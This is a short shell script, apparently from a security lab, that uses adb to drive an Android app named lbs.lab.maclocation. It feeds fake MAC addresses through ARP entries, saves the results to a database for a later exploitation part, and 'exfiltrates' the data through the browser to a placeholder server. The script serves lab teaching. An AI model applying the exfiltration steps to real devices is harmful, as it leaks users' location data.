#!/bin/sh
cd ~/Android/Sdk/platform-tools

# launch application

./adb shell am start -n lbs.lab.maclocation/.MainActivity
sleep 2

# feed in test data

./adb shell arp -s 192.168.232.1 aa:aa:aa:aa:aa:aa
sleep 1
./adb shell input tap 700 1100

./adb shell arp -s 192.168.232.1 bb:bb:bb:bb:bb:bb
sleep 1
./adb shell input tap 700 1100

./adb shell arp -s 192.168.232.1 cc:cc:cc:cc:cc:cc
sleep 1
./adb shell input tap 700 1100

./adb shell arp -s 192.168.232.1 dd:dd:dd:dd:dd:dd
sleep 1
./adb shell input tap 700 1100

./adb shell arp -s 192.168.232.1 ee:ee:ee:ee:ee:ee
sleep 1
./adb shell input tap 700 1100

./adb shell arp -s 192.168.232.1 ff:ff:ff:ff:ff:ff
sleep 1
./adb shell input tap 700 1100

# reset so that networking works (turn wifi off and on)

./adb shell input swipe  400 10 400 1000
sleep 1
./adb shell input tap 100 250
sleep 1
./adb shell input tap 100 250
sleep 1
./adb shell input tap 400 1000
sleep 3

# save to database (to be exploited later in 2nd part of lab)

./adb shell input tap 700 100
sleep 1
./adb shell input tap 700 100
sleep 1

# exfiltrate data via browser

./adb shell input tap 700 100
sleep 1
./adb shell input tap 700 400
sleep 1
### replace 'your server' with the address to your local server
./adb shell input text 'your server'
sleep 1
./adb shell input tap 650 750
sleep 3

